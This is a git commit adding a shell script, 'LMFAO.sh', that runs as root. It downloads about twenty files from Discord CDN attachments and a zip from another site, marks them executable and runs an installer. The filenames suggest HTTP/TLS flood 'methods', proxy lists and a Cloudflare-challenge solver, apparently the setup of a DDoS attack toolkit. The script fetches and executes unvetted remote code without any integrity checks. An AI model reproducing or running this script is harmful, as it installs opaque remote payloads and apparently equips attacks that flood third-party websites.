2402d5c523bc171fce8202259dd0bb6e3b9aef63
Mustafa <105736449+enotovvhhv@users.noreply.github.com>
2022-09-09 22:11:19 +0300

    Add files via upload

---
+++ LMFAO.sh
@@ -0,0 +1,50 @@
+cd /root/
+apt install dos2unix -y
+curl -O https://cdn.discordapp.com/attachments/983410774192050266/983410844576669746/startup.sh
+curl -O https://cdn.discordapp.com/attachments/983410774192050266/983410844773806100/tls2.js
+curl -O https://cdn.discordapp.com/attachments/983410774192050266/983410845063188530/tlsmethod.go
+curl -O https://cdn.discordapp.com/attachments/983410774192050266/983410845264527370/ubuntu-debian.sh
+curl -O https://cdn.discordapp.com/attachments/983410774192050266/983410845436477471/registery.go
+curl -O https://cdn.discordapp.com/attachments/983410774192050266/983410893125738516/httpbrowser
+curl -O https://cdn.discordapp.com/attachments/983410774192050266/983410894123966494/httpgetv2
+curl -O https://cdn.discordapp.com/attachments/983410774192050266/983410894295924783/install2.sh
+curl -O https://cdn.discordapp.com/attachments/983410774192050266/983410894602129428/prox.sh
+curl -O https://cdn.discordapp.com/attachments/983410774192050266/983410894795051038/api
+curl -O https://cdn.discordapp.com/attachments/983410774192050266/983410895449374720/api.go
+curl -O https://cdn.discordapp.com/attachments/983410774192050266/983410895671689216/bad
+curl -O https://cdn.discordapp.com/attachments/983410774192050266/983410896485380187/browsermethod.go
+curl -O https://cdn.discordapp.com/attachments/983410774192050266/983410896720236635/http.txt
+dos2unix *
+chmod +x *
+mkdir SocketBrowser
+cd SocketBrowser
+curl -O https://cdn.discordapp.com/attachments/983410774192050266/983421759984382032/go.sum
+curl -O https://cdn.discordapp.com/attachments/983410774192050266/983421760168919140/main.go
+curl -O https://cdn.discordapp.com/attachments/983410774192050266/983421760378662993/proxies.txt
+curl -O https://cdn.discordapp.com/attachments/983410774192050266/983421760563200060/SocketBrowser
+curl -O https://cdn.discordapp.com/attachments/983410774192050266/983421761255276684/go.mod
+dos2unix *
+chmod +x *
+mkdir flaresolver
+cd flaresolver
+curl -O https://cdn.discordapp.com/attachments/983410774192050266/983424776754319420/solver.go
+dos2unix *
+chmod +x *
+cd ..
+curl -O https://sheesh.rip/flaresolverr.zip --http1.1 --user-agent 'hello'
+apt install p7zip-full -y
+dos2unix *
+7za x -y flaresolverr.zip
+rm -rf flaresolverr.zip
+cd flaresolverr
+chmod +x **
+dos2unix **
+dos2unix *
+chmod +x *
+sleep 20
+cd /root/
+bash ubuntu-debian.sh
+npm i randomstring
+chmod +x **
+dos2unix **
+echo now run install2.sh
